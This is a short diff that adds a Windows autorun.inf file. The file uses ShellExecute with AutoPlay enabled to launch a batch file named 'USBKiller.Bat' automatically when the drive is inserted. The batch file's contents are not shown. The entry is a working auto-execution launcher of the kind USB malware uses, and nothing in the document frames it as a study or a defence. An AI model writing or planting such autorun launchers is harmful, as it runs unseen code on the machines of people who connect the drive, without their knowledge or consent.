@@ -1,0 +1,4 @@
+[autorun]
+;Open=USBKiller.Bat
+ShellExecute=USBKiller.Bat
+UseAutoPlay=1
